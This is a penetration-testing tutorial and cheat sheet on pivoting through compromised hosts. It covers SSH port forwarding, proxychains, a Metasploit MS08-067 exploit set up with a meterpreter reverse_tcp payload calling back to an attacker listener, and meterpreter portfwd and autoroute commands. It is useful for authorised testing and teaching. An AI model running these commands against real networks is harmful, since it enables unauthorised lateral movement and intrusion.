

# Pivoting on a Penetration Test

## What is Pivoting ?

Pivoting allows a security consultant to use a host compromised during a [pen testing](https://www.aptive.co.uk/penetration-testing/) engagement to route traffic to other hosts or subnets, giving the tester access to other machines that may have previously inaccessible. Typically, a foot hold is established on a target network from successfully exploiting an external machine on a penetration test or from a successful phishing / spear phishing campaign.

This article focuses specifically on pivoting from compromised Linux hosts using SSH and meterpreter pivoting, however the Meterpreter pivoting techniques also apply to Windows targets. 

## SSH Pivoting on Pen Tests 

SSH port forwarding is a reliable method of pivoting for Linux hosts, the draw back being that a new port forwarding rule needs to be created for each port you wish to access the host on. For example, if you discover a host has SMB and RDP exposed you would need to create a SSH port forwarding rule (see example below) for both ports <code>445</code> and <code>3389</code>. Due to this limitation it's often preferred to conduct scanning either from a compromised machine (using a single binary you can remove once testing has completed) or use Dynamic Proxychain forwarding (see example below) for the initial nmap scan to see what's exposed. Although it's additional effort to setup SSH port forwarding, the extra work is worth it as it allows you to have a stable connection while testing. 

<div>
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>ssh -L 9999:10.0.2.2:445 user@192.168.2.250</code></p>
      </td>
      <td>
            <p>SSH port forwarding. Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250</p>
      </td>
    </tr>
      <tr>
      <td>
        <p><code>ssh -D 127.0.0.1:9050 root@192.168.2.250</code></p>
      </td>
      <td>
            <p>Proxychains Forwarding - Dynamically allows all port forwards to the subnets availble on the target.</p>
      </td>
    </tr>
      </tbody>
</table>
</div>

## Note on Proxychain port forwards 

Dynamic SSH Proxychain forwarding does not work with meterpreter shells. 

If you attempt to spawn a shell via Meterpreter, you'll get an error similar to the following:


```bash 
meterpreter > execute -f cmd.exe -i -H
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:41713-<--timeout
``` 

## How to use Proxychain port forwards 

All commands must be prefixed with <code>proxychains</code> in order to route traffic correctly. 

### Example connecting to RDP over Proxychains 

```bash 
proxychains rdesktop TARGET-ADDRESS 
``` 

## Metasploit SSH Pivoting Example 

The following example assumes you have setup the SSH port forward using the instructions above and port: <code>9999</code> is forwarded to 445. The Metasploit module for **MS08_067** is used here to demonstrate how one can set up SSH pivoting within Metasploit itself.

**Attacking Machine:** 192.168.3.99 

```bash
msf exploit(ms08_067_netapi) > show options

 Module options (exploit/windows/smb/ms08_067_netapi):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOST    0.0.0.0          yes       The target address
    RPORT    9999             yes       Set the SMB service port
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


 Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
    LHOST     192.168.3.99     yes       The listen address
    LPORT     443              yes       The listen port

 Exploit target:

    Id  Name
    --  ----
   0   Automatic Targeting
``` 

## Meterpreter Pivoting Cheat Sheet 

If you have successfully compromised a host during a penetration test it's possible to use a Meterpreter shell to pivot to other hosts on the network. Using Meterpreter it's possible to pivot from compromised Windows and Linux targets, however it's typically far less reliable than SSH port forwarding as Meterpreter sessions are more prone to timing out, which will result in the connection being killed. 

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>portfwd add –l 3389 –p 3389 –r target-host</code></p>
      </td>
      <td>
            <p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>portfwd delete  –l 3389 –p 3389 –r target-host</code></p>
      </td>
      <td>
            <p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>portfwd flush</code></p>
      </td>
      <td>
            <p>Delete all port forwards</p>
      </td>
    </tr>


    <tr>
      <td>
        <p><code>portfwd list</code></p>
      </td>
      <td>
            <p>List active port forwards</p>
      </td>
    </tr>


    <tr>
      <td>
        <p><code>run autoroute -s 192.168.15.0/24</code></p>
      </td>
      <td>
            <p>Run the Autoroute script to automatically add rules to route traffic for the subnet <code>192.168.15.0</code> through the compromised host.</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>run autoroute -p</code></p>
      </td>
      <td>
            <p>List all active routes for the current meterpreter session.</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>route</code></p>
      </td>
      <td>
            <p>View available networks the compromised host can access</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>route add 192.168.14.0 255.255.255.0 3</code></p>
      </td>
      <td>
            <p>Add route for 192.168.14.0/24 via Session 3.</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>route delete 192.168.14.0 255.255.255.0 3</code></p>
      </td>
      <td>
            <p>Delete route for 192.168.14.0/24 via Session 3.</p>
      </td>
    </tr>


    <tr>
      <td>
        <p><code>route flush</code></p>
      </td>
      <td>
            <p>Delete all Meterpreter routes</p>
      </td>
    </tr>

      </tbody>
</table>

 
## How to Connect to targets using Meterpreter Port Forwards 

The port is forwarded locally to the target. Using RDP as an example, assuming you have setup a meterpreter port forward using the same port for local and remote. You would connect to it using: 

```bash 
rdesktop 127.0.0.1
```

EOF
